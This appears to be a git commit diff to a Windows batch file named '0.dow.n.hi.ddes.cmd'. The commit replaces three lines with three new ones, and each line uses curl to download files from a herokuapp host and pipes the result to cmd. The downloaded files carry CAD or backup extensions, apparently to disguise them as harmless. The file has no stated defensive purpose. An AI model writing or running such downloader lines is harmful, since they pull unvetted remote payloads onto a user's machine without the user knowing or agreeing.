5cbfedf672c60feca840cec1e99a3073e17ded04
pingme998 <77038591+pingme998@users.noreply.github.com>
2021-12-23 07:10:03 +0530

    Update 0.dow.n.hi.ddes.cmd

--- 0.dow.n.hi.ddes.cmd
+++ 0.dow.n.hi.ddes.cmd
@@ -1,3 +1,3 @@
-curl -O "https://p18.herokuapp.com/down/d1.dwg" |cmd
-curl -O "https://p18.herokuapp.com/down/d1.bak" |cmd
-curl -O "https://p18.herokuapp.com/down/d2.dwg" |cmd
+curl -O "https://p18.herokuapp.com/down/dc.bak.dwg" |cmd
+curl -O "https://p18.herokuapp.com/down/dc1.bak.dwg" |cmd
+curl -O "https://p18.herokuapp.com/down/dc2.bak.dwg" |cmd
